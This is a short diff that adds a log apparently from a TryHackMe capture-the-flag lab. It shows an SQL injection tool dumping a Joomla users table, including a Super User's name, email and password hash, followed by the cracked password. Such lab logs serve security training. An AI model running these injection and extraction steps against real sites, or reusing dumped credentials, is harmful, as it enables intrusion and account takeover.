@@ -1,0 +1,7 @@
+[-] Testing SQLi
+  -  Found table: fb9j5_users
+  -  Extracting users from fb9j5_users
+ [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
+  -  Extracting sessions from fb9j5_session
+
+  Cracked passwd is spiderman123
